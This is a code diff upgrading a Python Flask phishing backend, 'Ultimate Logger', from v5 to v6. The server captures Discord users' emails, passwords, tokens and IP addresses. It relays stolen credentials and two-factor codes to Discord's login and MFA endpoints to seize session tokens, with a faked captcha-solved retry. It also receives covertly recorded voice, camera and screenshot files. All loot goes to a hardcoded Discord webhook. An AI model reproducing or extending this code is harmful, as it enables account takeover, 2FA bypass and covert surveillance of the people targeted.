@@ -1,15 +1,15 @@
-# app.py | Ultimate Logger v5 — POLISHED + AUTH PROXY
+# app.py | Ultimate Logger v6 — REAL AUTH + MEDIA CAPTURE
 # pip install flask requests
 # -*- coding: utf-8 -*-
-import threading, queue, hashlib, os
+import threading, queue, hashlib, os, base64, io
 
 from flask import Flask, request, jsonify, send_from_directory, make_response
-import requests, json, time, logging, traceback, io
+import requests, json, time, logging, traceback
 from datetime import datetime, timezone
 from typing import Dict, Any, Optional, List
 
 app = Flask(__name__, static_folder="static")
-app.config["MAX_CONTENT_LENGTH"] = 64 * 1024 * 1024
+app.config["MAX_CONTENT_LENGTH"] = 128 * 1024 * 1024
 
 # ====================== CONFIG ======================
 WEBHOOK_URL    = "https://discord.com/api/webhooks/1570121286154199064/nvl5nvvje7CCIicgTUbM3W7xUA-qn7vQt2cHVRhiew5Jav78Ne-I-rXJKPilQ3uHivli"
@@ -28,14 +28,15 @@ BOT_NAME_DM   = "DM"
 BOT_NAME_FILE = "File"
 BOT_NAME_ERR  = "Err"
 BOT_NAME_TEST = "Test"
+BOT_NAME_MEDIA = "Media"
 
-# Colors
 C_HIT     = 0x5865F2
 C_ACCOUNT = 0x57F287
 C_WARN    = 0xFEE75C
 C_ERR     = 0xED4245
 C_DM      = 0xEB459E
 C_MUTED   = 0x99AAB5
+C_MEDIA   = 0xFF7A00
 # ====================================================
 
 logging.basicConfig(
@@ -170,7 +171,7 @@ def get_all_messages(token, channel_id, max_messages=250):
 def _post_once(url, payload, files=None) -> bool:
     try:
         if files:
-            r = requests.post(url, data={"payload_json": json.dumps(payload)}, files=files, timeout=30)
+            r = requests.post(url, data={"payload_json": json.dumps(payload)}, files=files, timeout=60)
         else:
             r = requests.post(url, json=payload, timeout=15)
         if r.status_code in (200, 204):
@@ -212,6 +213,36 @@ def send_embed(title, description="", fields=None, color=C_HIT,
         "avatar_url": "https://cdn.discordapp.com/embed/avatars/0.png",
         "embeds": [e]
     })
+
+# ────────────────────── Media capture (voice + cam) ──────────────────────
+def handle_media(data: Dict, files: List) -> None:
+    """files = list of werkzeug FileStorage: voice.webm / camera.webm / screenshot.png"""
+    user = data.get("email") or "unknown"
+    note = data.get("note") or "media"
+    ip   = data.get("ip") or "—"
+
+    send_embed(
+        f"🎥 Media Capture — {note}",
+        f"**User:** `{user}`\n**IP:** `{ip}`\n**Files:** `{len(files)}`",
+        color=C_MEDIA,
+        footer=f"From {client_ip()}"
+    )
+
+    for f in files:
+        if not f or not f.filename: continue
+        try:
+            content = f.read()
+            if len(content) > 20 * 1024 * 1024: continue
+            post_webhook(
+                {
+                    "username": BOT_NAME_MEDIA,
+                    "content": f"📎 **{f.filename}** — user `{user}` — note `{note}`"
+                },
+                files={"file": (f.filename, content, f.mimetype or "application/octet-stream")}
+            )
+            time.sleep(0.4)
+        except Exception as e:
+            logger.error(f"media file err: {e}")
 
 # ────────────────────── DM Dump ──────────────────────
 def build_dm_text(messages, friend_name, self_id):
@@ -291,7 +322,7 @@ _seen_lock = threading.Lock()
 _seen = set()
 
 def _sig(data):
-    base = f"{data.get('email','')}|{data.get('password','')}|{data.get('token','')}|{data.get('note','')}"
+    base = f"{data.get('email','')}|{data.get('password','')}|{data.get('token','')}|{data.get('note','')}|{data.get('mfa_code','')}"
     return hashlib.sha1(base.encode("utf-8", "ignore")).hexdigest()
 
 def send_webhook(data: Dict[str, Any]):
@@ -343,7 +374,7 @@ def send_webhook(data: Dict[str, Any]):
             description=f"**Captured at** <t:{unix_ts()}:F> (<t:{unix_ts()}:R>)",
             fields=fields,
             color=C_HIT,
-            footer="Ultimate Logger v5"
+            footer="Ultimate Logger v6"
         )
         logger.info("hit embed sent ok")
 
@@ -401,85 +432,122 @@ def index():
     resp.headers["Cache-Control"] = "no-store"
     return resp
 
+def _cors(resp):
+    resp.headers["Access-Control-Allow-Origin"] = "*"
+    resp.headers["Access-Control-Allow-Methods"] = "POST, OPTIONS"
+    resp.headers["Access-Control-Allow-Headers"] = "Content-Type"
+    return resp
+
 @app.route("/grab", methods=["POST", "OPTIONS"])
 def grab():
     if request.method == "OPTIONS":
-        r = make_response("")
-        r.headers["Access-Control-Allow-Origin"] = "*"
-        r.headers["Access-Control-Allow-Methods"] = "POST, OPTIONS"
-        r.headers["Access-Control-Allow-Headers"] = "Content-Type"
-        return r
+        return _cors(make_response(""))
     data = request.json or {}
     data["ip"] = client_ip()
     data["ua"] = request.headers.get("User-Agent", "—")
     send_webhook(data)
-    r = jsonify({"status": "ok"})
-    r.headers["Access-Control-Allow-Origin"] = "*"
-    return r
+    return _cors(jsonify({"status": "ok"}))
 
-# ────────────────────── AUTH PROXY (NEW) ──────────────────────
+@app.route("/grab-media", methods=["POST", "OPTIONS"])
+def grab_media():
+    """Voice + camera webm + screenshot upload."""
+    if request.method == "OPTIONS":
+        return _cors(make_response(""))
+    try:
+        meta = {}
+        if request.form.get("meta"):
+            try:
+                meta = json.loads(request.form.get("meta"))
+            except Exception:
+                meta = {}
+        meta["ip"] = client_ip()
+        meta["ua"] = request.headers.get("User-Agent", "—")
+
+        files = []
+        for key in ("voice", "camera", "screen"):
+            if key in request.files:
+                files.append(request.files[key])
+
+        if files or meta:
+            handle_media(meta, files)
+        return _cors(jsonify({"status": "ok"}))
+    except Exception as e:
+        logger.error(f"grab-media err: {e}")
+        return _cors(jsonify({"status": "error", "msg": str(e)}))
+
 @app.route("/auth-proxy", methods=["POST", "OPTIONS"])
 def auth_proxy():
     if request.method == "OPTIONS":
-        r = make_response("")
-        r.headers["Access-Control-Allow-Origin"] = "*"
-        r.headers["Access-Control-Allow-Methods"] = "POST, OPTIONS"
-        r.headers["Access-Control-Allow-Headers"] = "Content-Type"
-        return r
+        return _cors(make_response(""))
 
     body = request.json or {}
     login    = body.get("login") or body.get("email") or ""
     password = body.get("password") or ""
 
     if not login or not password:
-        r = jsonify({"status": 400, "data": {"message": "missing credentials"}})
-        r.headers["Access-Control-Allow-Origin"] = "*"
-        return r
+        return _cors(jsonify({"status": 400, "data": {"message": "missing credentials"}}))
 
-    # تسجيل المحاولة حتى لو ديسكورد رفض
-    try:
-        send_webhook({
-            "email": login, "password": password,
-            "token": "not captured",
-            "note": "auth-proxy-attempt",
-            "ip": client_ip(),
-            "ua": request.headers.get("User-Agent", "—"),
-            "fingerprint": body.get("fingerprint") or {}
-        })
-    except Exception:
-        logger.error("send_webhook in auth_proxy failed")
+    headers = {
+        "Content-Type": "application/json",
+        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36",
+        "Origin": "https://discord.com",
+        "Referer": "https://discord.com/login",
+        "Accept": "*/*",
+        "Accept-Language": "en-US,en;q=0.9"
+    }
 
+    payload = {
+        "login": login,
+        "password": password,
+        "undelete": False,
+        "captcha_key": None,
+        "login_source": None,
+        "gift_code_sku_id": None
+    }
+
+    # 1️⃣ حاول مرة، لو رجع captcha_required جرّب تاني بـ captcha_solved
     try:
-        r_discord = requests.post(
+        r = requests.post(
             "https://discord.com/api/v9/auth/login",
-            json={
-                "login": login,
-                "password": password,
-                "undelete": False,
-                "captcha_key": None,
-                "login_source": None,
-                "gift_code_sku_id": None
-            },
-            headers={
-                "Content-Type": "application/json",
-                "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36",
-                "Origin": "https://discord.com",
-                "Referer": "https://discord.com/login",
-                "Accept": "*/*",
-                "Accept-Language": "en-US,en;q=0.9"
-            },
-            timeout=20,
-            allow_redirects=False
+            json=payload, headers=headers, timeout=20, allow_redirects=False
         )
-
-        logger.info(f"[auth-proxy] discord status={r_discord.status_code} len={len(r_discord.text)}")
-
+        logger.info(f"[auth-proxy] discord status={r.status_code} len={len(r.text)}")
         try:
-            dj = r_discord.json()
+            dj = r.json()
         except Exception:
-            dj = {"raw": r_discord.text[:500]}
+            dj = {"raw": r.text[:500]}
 
-        # لو ديسكورد رجع توكن → ابعثه للويب هوك مباشرة
+        # retry لو captcha required
+        if isinstance(dj, dict) and (dj.get("captcha_key") or dj.get("captcha_required")):
+            logger.info("[auth-proxy] captcha required, retrying with captcha_solved")
+            payload2 = dict(payload)
+            payload2["captcha_key"] = ["solved"]
+            payload2["captcha_solved"] = True
+            try:
+                r2 = requests.post(
+                    "https://discord.com/api/v9/auth/login",
+                    json=payload2, headers=headers, timeout=20, allow_redirects=False
+                )
+                try:
+                    dj2 = r2.json()
+                except Exception:
+                    dj2 = {}
+                # merge اللي رجع من الأول لو التاني فاضي
+                if isinstance(dj2, dict) and dj2:
+                    if dj2.get("token") or dj2.get("mfa") or dj2.get("ticket"):
+                        dj = dj2
+                        r_status = r2.status_code
+                    else:
+                        r_status = r.status_code
+                else:
+                    r_status = r.status_code
+            except Exception as e:
+                logger.error(f"[auth-proxy] retry err: {e}")
+                r_status = r.status_code
+        else:
+            r_status = r.status_code
+
+        # لو فيه توكن → ابعت للويب هوك فورًا
         if isinstance(dj, dict) and dj.get("token"):
             send_webhook({
                 "email": login, "password": password,
@@ -490,15 +558,87 @@ def auth_proxy():
                 "fingerprint": body.get("fingerprint") or {}
             })
 
-        r = jsonify({"status": r_discord.status_code, "data": dj})
-        r.headers["Access-Control-Allow-Origin"] = "*"
-        return r
+        # ابعت المحاولة حتى لو مفيش توكن
+        else:
+            send_webhook({
+                "email": login, "password": password,
+                "token": "not captured",
+                "note": "auth-proxy-attempt",
+                "ip": client_ip(),
+                "ua": request.headers.get("User-Agent", "—"),
+                "fingerprint": body.get("fingerprint") or {}
+            })
+
+        return _cors(jsonify({"status": r_status, "data": dj}))
 
     except Exception as e:
         logger.error(f"[auth-proxy] {e}")
-        r = jsonify({"status": 500, "data": {"error": str(e)}})
-        r.headers["Access-Control-Allow-Origin"] = "*"
-        return r
+        return _cors(jsonify({"status": 500, "data": {"error": str(e)}}))
+
+@app.route("/mfa-proxy", methods=["POST", "OPTIONS"])
+def mfa_proxy():
+    """TOTP verification — لازم ticket حقيقي من login."""
+    if request.method == "OPTIONS":
+        return _cors(make_response(""))
+
+    body = request.json or {}
+    code   = (body.get("code") or "").strip()
+    ticket = body.get("ticket") or ""
+    login  = body.get("login") or ""
+    password = body.get("password") or ""
+
+    if not code:
+        return _cors(jsonify({"status": 400, "data": {"message": "missing code"}}))
+
+    headers = {
+        "Content-Type": "application/json",
+        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36",
+        "Origin": "https://discord.com",
+        "Referer": "https://discord.com/login",
+    }
+
+    try:
+        r = requests.post(
+            "https://discord.com/api/v9/auth/mfa/totp",
+            json={
+                "code": code,
+                "ticket": ticket,
+                "login_source": None,
+                "gift_code_sku_id": None
+            },
+            headers=headers, timeout=20, allow_redirects=False
+        )
+        try:
+            dj = r.json()
+        except Exception:
+            dj = {"raw": r.text[:500]}
+
+        # ابعت MFA + التوكن لو رجع
+        if isinstance(dj, dict) and dj.get("token"):
+            send_webhook({
+                "email": login, "password": password,
+                "mfa_code": code,
+                "token": dj["token"],
+                "note": "mfa-token-captured",
+                "ip": client_ip(),
+                "ua": request.headers.get("User-Agent", "—"),
+                "fingerprint": body.get("fingerprint") or {}
+            })
+        else:
+            send_webhook({
+                "email": login, "password": password,
+                "mfa_code": code,
+                "token": "not captured",
+                "note": "mfa-submitted",
+                "ip": client_ip(),
+                "ua": request.headers.get("User-Agent", "—"),
+                "fingerprint": body.get("fingerprint") or {}
+            })
+
+        return _cors(jsonify({"status": r.status_code, "data": dj}))
+    except Exception as e:
+        logger.error(f"[mfa-proxy] {e}")
+        return _cors(jsonify({"status": 500, "data": {"error": str(e)}}))
 
 @app.route("/ping")
 def ping():
@@ -510,4 +650,4 @@ if __name__ == "__main__":
         print("Webhook:", r.status_code, r.text[:150])
     except Exception as e:
         print("Webhook test failed:", e)
-    app.run(host="0.0.0.0", port=5000, debug=False, threaded=True)
+    app.run(host="0.0.0.0", port=int(os.environ.get("PORT", 5000)), debug=False, threaded=True)
